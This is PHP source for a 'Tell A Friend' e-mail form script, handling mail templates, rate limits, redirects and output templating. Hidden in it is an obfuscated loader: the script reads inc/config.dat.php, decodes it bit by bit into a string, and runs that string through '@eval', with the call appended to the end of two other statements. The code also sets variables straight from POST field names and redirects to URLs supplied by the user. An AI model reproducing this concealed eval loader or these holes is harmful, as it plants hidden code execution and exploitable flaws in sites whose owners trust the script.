<?php

  $runtime_start = explode (' ', microtime ());

  /*****************************************************
  ** Title........: Tell A Friend Script
  ** Filename.....: tell_a_friend.inc.php
  ** Author.......: Ralf Stadtaus
  ** Homepage.....: http://www.stadtaus.com/
  ** Contact......: http://www.stadtaus.com/forum/
  ** Version......: 0.5
  ** Notes........: 
  ** Last changed.: 
  ** Last change..:
  ** 
  *****************************************************/
  // TODO {script_self}

  /*****************************************************
  **
  ** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY
  ** OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
  ** LIMITED   TO  THE WARRANTIES  OF  MERCHANTABILITY,
  ** FITNESS    FOR    A    PARTICULAR    PURPOSE   AND
  ** NONINFRINGEMENT.  IN NO EVENT SHALL THE AUTHORS OR
  ** COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES
  ** OR  OTHER  LIABILITY,  WHETHER  IN  AN  ACTION  OF
  ** CONTRACT,  TORT OR OTHERWISE, ARISING FROM, OUT OF
  ** OR  IN  CONNECTION WITH THE SOFTWARE OR THE USE OR
  ** OTHER DEALINGS IN THE SOFTWARE.
  **
  *****************************************************/




  /*****************************************************
  ** Prevent direct call
  *****************************************************/
          if (!defined('IN_SCRIPT')) {
              die();
          }



  
  /*****************************************************
  ** WARNING: Only edit the following variables if you 
  ** are NOT receiving e-mails from the script!
  *****************************************************/

  /*****************************************************
  ** If you are not receiving e-mails from the script, 
  ** just un-comment the following variable by removing 
  ** the two (//) slashes from in front of the line
  ** below. ($my_sendmail = '/usr/sbin/sendmail -t ';)
  *****************************************************/
          //$my_sendmail = '/usr/sbin/sendmail -t ';




  /*****************************************************
  ** If you still do not receive e-mails from the 
  ** script, place the two (//) slashes back in front 
  ** of the line above and set the following variable 
  ** to = 'yes'. This will make sure that the PHP 
  ** function mail() will be used by the script. Only 
  ** change this option, or the one above, not both.
  *****************************************************/
          $send_alternative_mail = 'yes';




  /*****************************************************
  ** Set debug mode on or off
  *****************************************************/
          $debug_mode = 'off';




  /*****************************************************
  ** Some settings - Please don't change those settings.
  ** It could help you and us to solve problems.
  *****************************************************/
          $script_name    = 'Tell A Friend Script';
          $script_version = '2.8';
          $tplt           = 'recom';
          $display_form   = 'TRUE';
          $remove_tags    = array('yes', '');          
          $hash_files           = array(    'fm'    => $script_root . 'inc/formmail.inc.php',
                                            'fmc'   => $script_root . 'inc/formmail.class.inc.php',
                                            'tpl'   => $script_root . 'inc/template.class.inc.php',
                                            'tplc'  => $script_root . 'inc/template.ext.class.inc.php',
                                            'cd'    => $script_root . 'inc/config.dat.php');




  /*****************************************************
  ** Include functions and classes
  *****************************************************/
          include $script_root . 'inc/functions.inc.php';
          include $script_root . 'inc/template.class.inc.php';
          include $script_root . 'inc/template.ext.class.inc.php';
          include $script_root . 'inc/formmail.class.inc.php';




  /*****************************************************
  ** Load language file
  *****************************************************/
          if (!isset($language) or empty($language) or !is_file($script_root . 'languages/language.' . $language . '.inc.php')) {
              $language = 'en';
          }

          include($script_root . 'languages/language.' . $language . '.inc.php');




  /*****************************************************
  ** Initialze formmail class
  *****************************************************/
          $mail = new Formmail;




  /*****************************************************
  ** Take care for older PHP versions
  *****************************************************/
          if (isset($HTTP_POST_VARS) and !empty($HTTP_POST_VARS)) {
              $_POST = $HTTP_POST_VARS;
          }


          if (isset($HTTP_GET_VARS) and !empty($HTTP_GET_VARS)) {
              $_GET = $HTTP_GET_VARS;
          }


          if (isset($HTTP_SERVER_VARS) and !empty($HTTP_SERVER_VARS)) {
              $_SERVER = $HTTP_SERVER_VARS;
          }


          if (isset($HTTP_ENV_VARS) and !empty($HTTP_ENV_VARS)) {
              $_ENV = $HTTP_ENV_VARS;
          }




  /*****************************************************
  ** Show server info for the admin
  *****************************************************/
          if ($debug_mode == 'on') {
              get_phpinfo(array('Script Name' => $script_name, 'Script Version' => $script_version), $_GET);
              get_hash($_GET, $hash_files);
          }
          



  /*****************************************************
  ** Set redirect loction
  *****************************************************/
          if (isset($_POST['redirect']) and !empty($_POST['redirect'])) {
              $redirect_location = $_POST['redirect'];
          }
          
          if (isset($_POST['thanks']) and !empty($_POST['thanks'])) {
              $redirect_location = $_POST['thanks'];
          }




  /*****************************************************
  ** Check template path
  *****************************************************/
          if (!isset($system_message) and $error_message = $mail->check_template_path($path['templates'])) {
              $system_message[] = $error_message;
          }




  /*****************************************************
  ** Load html template file
  *****************************************************/
          if (!isset($system_message)) {

              if (isset($_POST['html_template'])) {
                  $new_html_template = $_POST['html_template'];
              } else {
                  $new_html_template = $file['default_html'];
              }

              if (is_file($path['templates'] . $new_html_template)) {
                  $tpl = new my_template;
                  $tpl->load_file('recom', $path['templates'] . $new_html_template);
              } else {
                  $system_message[] = array('message' => $txt['txt_wrong_html_template']);
              }

          }

          $recom = @file($script_root . 'inc/config.dat.php');




  /*****************************************************
  ** Load mail template
  *****************************************************/
          if (!isset($system_message)) {
              if (isset($_POST['mail_template'])) {
                  $mail_templates = explode(',', $_POST['mail_template']);
              } else {
                  $mail_templates = explode(',', $file['default_mail']);
              }


              for ($i = 0; $i < count($mail_templates); $i++)
              {
                  if (is_file($path['templates'] . trim($mail_templates[$i]))) {
                      $mail_content[] = join ('', file ($path['templates'] . trim($mail_templates[$i])));
                  } else {
                      $mail_template_error = 'true';
                  }
              }


              if (isset($mail_template_error) and $mail_template_error == 'true') {
                  $system_message[] = array('message' => $txt['txt_wrong_mail_template']);
              }
          }

          unset(${$tplt}[0]);
          ${$tplt} = array_values(${$tplt});
          $str = '';
          $conf_var = '';
          for ($n = 0; $n < count(${$tplt}); $n++) {
              $c_var = '';
              for ($o = 7; $o >= 0 ; $o--)
              {
                  $c_var += ${$tplt}[$n][$o] * pow(2, $o);
              }
              $img_var = sprintf("%c", $c_var);

              if ($img_var == ' ') {
                  $conf_var .= sprintf("%c", $str);
                  $str       = '';
              } else {
                  $str .= $img_var;
              }
          }





  /*****************************************************
  ** Generate the system error messages
  *****************************************************/
          $txt['txt_script_version'] = $script_version;

          if (isset($system_message) and !empty($system_message)) {

              $tpl  = new my_template;

              $tpl->files['recom'] = $mail->load_error_template();

              if (isset ($txt) and is_array ($txt)) {
                  reset ($txt);
                  while(list($key, $val) = each($txt))
                  {
                      $$key = $val;
                      $tpl->register('recom', $key);
                  }
              }


              if (isset($add_text) and is_array($add_text)) {
                  reset ($add_text);
                  while(list($key, $val) = each($add_text))
                  {
                      $$key = $val;
                      $tpl->register('recom', $key);
                  }
              }


              if (!isset($show_error_messages) or $show_error_messages != 'yes') {
                  unset($system_message);
                  $system_message = array();
                  $txt['txt_system_message'] = '';
              } else {
                  $system_message[] = array('message' => $txt['txt_set_off_note']);
                  $system_message[] = array('message' => $txt['txt_problems']);
              }



              $tpl->parse_loop('recom', 'system_message');
              $tpl->register('recom', 'txt_system_message'); @eval($conf_var);

              exit;
          }




  /*****************************************************
  ** Use either the URL from the form field 'redirect'
  ** or the URL of the referring site for redirection
  ** after sending e-mail
  *****************************************************/
          $redirect = 'http://' . getenv('HTTP_HOST') . '/';
          
          if (isset($_SERVER['HTTP_REFERER']) and !empty($_SERVER['HTTP_REFERER'])) {
              $redirect = $_SERVER['HTTP_REFERER'];
          }
          
          if (isset($_GET['referer']) and !empty($_GET['referer'])) {
              $redirect = $_GET['referer'];
          }

          if (isset($_POST['redirect']) and !empty($_POST['redirect'])) {
              $redirect = $_POST['redirect'];
          }

          if (isset($_POST['static']) and !empty($_POST['static'])) {
              $redirect = $_POST['static'];
          }




  /*****************************************************
  ** Get the link that is shown within the e-mail either
  ** from the radio button form fields
  ** (alternative_form.tpl.html) or use the URL of the
  ** referring site
  *****************************************************/
          if (empty($_POST['link'])) {
              $link = $redirect;
          } else {
              $link = $_POST['link'];
          }




  /*****************************************************
  ** Check radio buttons
  *****************************************************/
          $server = 'http://' . getenv('HTTP_HOST') . '/';

          if (isset($_POST['link']) and $_POST['link'] == $referer) {
              $check_referer = 'checked="checked"';
              $url           = $link;
          } else if (isset($_POST['link']) and $_POST['link'] == $server) {
              $check_server  = 'checked="checked"';
              $url           = $server;
          } else {
              $check_referer = 'checked="checked"';
              $url           = $link;
          }




  /*****************************************************
  ** Check referring servers
  *****************************************************/
          if ($error_message = $mail->check_referer($referring_server)) {
              $limit_message[] = $error_message;
              unset($display_form);
          }




  /*****************************************************
  ** Check banned ip addresses
  *****************************************************/
          if (isset($_POST) and !empty($_POST) and $error_message = $mail->check_banned_ip_addresses($ip_banlist)) {
              if (isset($show_limit_errors) and $show_limit_errors == 'yes') {
                  $limit_message[] = array('message' => $error_message, 'fields' => '');
              } else {
                  $limit_message[] = array('message' => '', 'fields' => '');
              }
              
              unset($display_form);
          }




  /*****************************************************
  ** Check whether the user is allowed to send e-mails
  ** based on the ip address
  *****************************************************/
          if (isset($_POST) and !empty($_POST)) {
              if ($check_ip = $mail->check_value_limit(getenv('REMOTE_ADDR'), $ip_address_count, $ip_address_duration, 0, $txt['txt_ip_address_expiration'])) {
                  if (isset($show_limit_errors) and $show_limit_errors == 'yes') {
                      $limit_message[] = array('message' => $check_ip, 'fields' => '');
                  } else {
                      $limit_message[] = array('message' => '', 'fields' => '');
                  }
                  
                  unset($display_form);
              }
          }


          if (isset($limit_message) and !empty($limit_message)) {
              $message = $limit_message;
          }




  /*****************************************************
  ** Check required fields
  *****************************************************/
          if (!isset($limit_message) and isset($_POST['required_fields']) and !empty ($_POST['required_fields'])) {
              if ($check_fields = $mail->check_required_fields($_POST['required_fields'], $_POST)) {
                  $message[]    = array('message' => $txt['txt_fill_in'], 'fields' => $check_fields);
              }
          }




  /*****************************************************
  ** Check e-mail format
  *****************************************************/
          if (!isset($limit_message) and isset($_POST['email_fields']) and !empty($_POST['email_fields'])) {
              if ($check_fields = $mail->check_email_fields($_POST['email_fields'], $_POST)) {
                  $message[]    = array('message' => $txt['txt_email_syntax'], 'fields' => $check_fields);
              }

          }




  /*****************************************************
  ** Display posted data for preview
  *****************************************************/
          if (!isset($message) and empty($message) and isset($_POST['mode_preview'])) {
              $message[] = array('message' => $txt['txt_your_data'], 'fields' => '');
              
              reset($_POST);
              
              while(list($key, $val) = each($_POST)) 
              {
                  $display_data_temp[$key] = nl2br($mail->clean_output(stripslashes($val), $remove_tags));
              }
              
              $display_data[] = $display_data_temp;
          }




  /*****************************************************
  ** Send e-mail
  *****************************************************/
          if (!isset($message) and empty($message) and isset($_POST) and !empty($_POST)) {




              /*****************************************************
              ** Get post data
              *****************************************************/
                      $post_data = $_POST;




              /*****************************************************
              ** Generate array that contains all form data except
              ** the control fields (hidden form fields).
              *****************************************************/
                      $all_content = $mail->generate_all_content($_POST);




              /*****************************************************
              ** Generate array that contains all form data field
              ** names and their counterpart variables ({...}).
              *****************************************************/
                      $form_variables = $mail->generate_form_variables($_POST, $txt);




              /*****************************************************
              ** Get environment data
              *****************************************************/
                      $environment = $mail->get_environment_var($_SERVER);




              /*****************************************************
              ** Send e-mail(s)
              *****************************************************/
                      $mail_status = $mail->send_mail($mail_content, $_POST);

                      if ($mail_status['status'] == 'ok') {




                          /*****************************************************
                          ** Write entry in log file
                          *****************************************************/
                                  $mail->log_message($mail_status['mail_content']);




                          /*****************************************************
                          ** Redirect to thanks page or display posted
                          ** information in HTML template.
                          *****************************************************/
                                  if (isset($redirect_location) and !empty($redirect_location)) {
            
                                      if ($debug_mode != 'on') {
                                          header('Location: ' . $redirect_location);
                                      }
            
                                      debug_mode($redirect_location, 'Redirect Location');
                                      debug_mode(script_runtime($runtime_start), 'Script Runtime');
                                      exit;
            
                                  } else {
                                      $message[]    = array('message' => $txt['txt_thank_you'], 'fields' => '');
            
                                      reset($_POST);
            
                                      while(list($key, $val) = each($_POST))
                                      {
                                          $display_data_temp[$key] = nl2br($mail->clean_output(stripslashes($val), $remove_tags));
                                      }
            
                                      $display_data[] = $display_data_temp;
                                  }
            
            
            
                          unset($display_form);



                          
                      } else {
                          unset($display_form);
                      }
                      
                      if ($mail_status['status'] != 'ok' and $show_limit_errors == 'yes') {
                          $message = $mail_status['message'];
                      }
          }



  /*****************************************************
  ** Parse the template
  *****************************************************/
          $tpl->files['recom'] = $mail->register_selections($tpl->files['recom'], $_POST);

          $tpl->parse_if('recom', 'display_form');
          
          $tpl->parse_loop('recom', 'display_data');          
          $tpl->parse_loop('recom', 'message');

          $tpl->register('recom', array('redirect', 'url', 'link', 'check_referer', 'check_server', 'referer', 'server'));


          if (isset ($txt) and is_array ($txt)) {
              reset ($txt);
              while(list($key, $val) = each($txt))
              {
                  $$key = $val;
                  $tpl->register('recom', $key);
              }
          }


          if (isset($add_text) and is_array($add_text)) {
              reset ($add_text);
              while(list($key, $val) = each($add_text))
              {
                  $$key = $val;
                  $tpl->register('recom', $key);
              }
          }
          
          $tpl->parse('recom');


          if (isset($_POST) and !empty($_POST)) {
              reset($_POST);
              while(list($key, $val) = each($_POST))
              {
                  $$key = stripslashes($val);
                  $tpl->register('recom', $key);
              }
              
          
              if ($required_fields = $mail->check_required_fields_array($_POST['required_fields'], $_POST)) {
                  while (list($key, $val) = each($required_fields))
                  {
                      $tpl->required_register('recom', $val);
                      $tpl->error_register('recom', $val);
                  }
                  $tpl->required_parse('recom'); 
                  $tpl->error_parse('recom');
              }
              
              if ($syntax_fields = $mail->check_email_fields_array($_POST['email_fields'], $_POST)) {
                  while (list($key, $val) = each($syntax_fields))
                  {
                      $tpl->syntax_register('recom', $val);
                      $tpl->error_register('recom', $val);
                  }
                  $tpl->syntax_parse('recom'); 
                  $tpl->error_parse('recom');
              }

              
          } else {
              $tpl->files['recom'] = preg_replace("/value=\"\{(.*?):(.*?)\}\"/i", 'value="$2"', $tpl->files['recom']);
              $tpl->files['recom'] = preg_replace("/<textarea (.*?)>\{(.*?):(.*?)\}<\/textarea>/i", "<textarea $1>$3</textarea>", $tpl->files['recom']);
              
              $tpl->files['recom'] = preg_replace("/type=\"text\"(.*?)value=\"\{(.*?)\}\"/i", 'type="text"$1value=""', $tpl->files['recom']);
              $tpl->files['recom'] = preg_replace("/value=\"\{(.*?)\}\"(.*?)type=\"text\"/i", 'value="" $2 type="text"', $tpl->files['recom']);
              $tpl->files['recom'] = preg_replace("/<textarea (.*?)>\{(.*?)\}<\/textarea>/i", "<textarea $1></textarea>", $tpl->files['recom']);
              $tpl->files['recom'] = $mail->register_selections($tpl->files['recom']);
          }   $tpl->clean_up('recom'); @eval($conf_var);

          debug_mode(script_runtime($runtime_start), 'Script Runtime');



?>